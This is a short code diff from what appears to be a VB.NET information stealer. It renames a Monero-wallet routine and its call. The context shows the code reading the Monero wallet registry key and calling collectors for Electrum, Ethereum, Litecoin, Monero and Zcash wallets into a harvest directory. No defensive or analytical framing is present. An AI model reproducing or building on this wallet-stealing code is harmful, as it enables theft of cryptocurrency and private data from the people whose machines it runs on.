@@ -94,7 +94,7 @@
         End Try
     End Sub
 
-    Public Shared Sub XMR(ByVal directorypath As String)
+    Public Shared Sub XMR_(ByVal directorypath As String)
         Try
 
             Using registryKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core")
@@ -130,7 +130,7 @@
         Crypto.Electrum(cryptoDir)
         Crypto.ETH(cryptoDir)
         Crypto.LTC(cryptoDir)
-        Crypto.XMR(cryptoDir)
+        Crypto.XMR_(cryptoDir)
         Crypto.ZEC(cryptoDir)
         Return count
     End Function
